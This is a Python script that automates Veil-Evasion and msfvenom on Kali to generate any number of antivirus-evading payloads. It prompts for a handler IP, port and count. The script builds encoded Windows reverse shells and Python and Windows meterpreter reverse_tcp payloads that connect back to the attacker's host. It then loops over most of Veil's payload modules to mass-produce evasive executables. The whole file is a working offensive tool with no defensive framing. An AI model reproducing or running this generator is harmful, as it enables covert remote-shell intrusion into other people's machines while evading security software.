#! /usr/bin/python
#
# generate-payloads.py
# 

### Generate any number of veil-evasion payloads
### User specifies LHOST, LPORT and number of payloads
### Tested on Kali with Veil-Evasion installed via apt-get
import sys, argparse, time, os, socket, shutil
sys.path.insert(0, '/usr/share/veil-evasion')
os.chdir('/usr/share/veil-evasion')

from modules.common import controller
from modules.common import messages
from modules.common import supportfiles
from modules.common import helpers

def get_payload_count():
    isValid = False
    while not isValid:
        userIn = raw_input("Number of payloads: ")
        try:
            numPayloads = int(userIn)
            isValid = True
        except:
            print("Must be a number!")
    return numPayloads

def get_handler_addr():
    isValid = False
    while not isValid:
        userIn = raw_input("Handler IP: ")
        try:
            socket.inet_aton(userIn)
            isValid = True
        except:
            print("Not a valid IP address")
    return userIn

def get_handler_port():
    isValid = False
    while not isValid:
        userIn = raw_input("Handler Port: ")
        try:
            port = int(userIn)
            if (0 < port <= 65535):
                isValid = True
            else:
                print("Not a valid port number")
        except:
            print("Not a valid port number")
    return port


def generate_payloads(numPayloads,handlerAddr,handlerPort):
    baseName = "veil-payload-"
    timestamp = int(time.time())
    lhost = "LHOST="+str(handlerAddr)
    lport = "LPORT="+str(handlerPort)

    # Generate revse_tcp payload for veil external exe/py encryptors
    print("Generating test executable...")
    exeName = "/user/share/veil-evasion/testbins/payload.exe"
    pyName = "/user/share/veil-evasion/testbins/payload.py"
    os.system("msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp %s %s -e x86/shikata_ga_nai -f exe -o /usr/share/veil-evasion/testbins/payload.exe" % (lhost,lport))
    os.system('msfvenom -p python/meterpreter_reverse_tcp -o /usr/share/veil-evasion/testbins/payload.py')
    
    print("Generating %d payloads..." % numPayloads)
    
    # Instantiate main controller
    list_controller = controller.Controller(oneRun=True)

    # Load payloads from veil
    for (name, payload) in  list_controller.payloads:
        # Payloads that need fixing to work...
        toDo = ["auxiliary/macro_converter","native/hyperion","native/pe_scrambler","powershell/shellcode_inject/download_virtual","perl/shellcode_inject/flat","powershell/shellcode_inject/download_virtual_https"]
        if name not in toDo:
            print("Generating payloads for %s..." % name)

            # Initialize options
            options = {}
            options['required_options'] = {}

            # Check for required options
            if hasattr(payload, 'required_options'):
                for key in sorted(payload.required_options.iterkeys()):
                    if key == 'LHOST':
                        options['required_options']['LHOST'] = [str(handlerAddr), '']
                    elif key == 'LPORT':
                        options['required_options']['LPORT'] = [str(handlerPort), '']
                    elif key == 'DOWNLOAD_HOST':
                        options['required_options']['DOWNLOAD_HOST'] = [str(handlerAddr), '']
                    elif key == 'ORIGINAL_EXE':
                        if name != 'native/backdoor_factory':
                            options['required_options']['ORIGINAL_EXE'] = exeName
                    elif key == 'PYTHON_SOURCE':
                        options['required_options']['PYTHON_SOURCE'] = pyName

            # Check payload for shellcode attribute
            if hasattr(payload, 'shellcode'):
                options['msfvenom'] = ["windows/meterpreter/reverse_tcp", [lhost,lport]] 

            class Args(object): pass
            args = Args()
            args.pwnstaller = True
            args.overwrite = True

            # Generate number of requested payloads
            for x in range(numPayloads):
                args.o = name.replace("/","_") + "-" + str(x)

                sample_controller = controller.Controller(oneRun=True)
                sample_controller.SetPayload(name, options)

                code = sample_controller.GeneratePayload()

                print(args.o)
                outName = sample_controller.OutputMenu(sample_controller.payload, code, showTitle=False, interactive=False, args=args)

        else:
            # Payload in To-Do list
            print("Skipping: %s" % name)


if __name__ == "__main__":
    print("***Veil-Evasion Payload Generator***")

    # Get number of payloads requested
    numPayloads = get_payload_count()

    # Get handler IP address
    handlerAddr = get_handler_addr()

    # Get handler port
    handlerPort = get_handler_port()

    # Generate payloads
    generate_payloads(numPayloads,handlerAddr,handlerPort)

    exit()
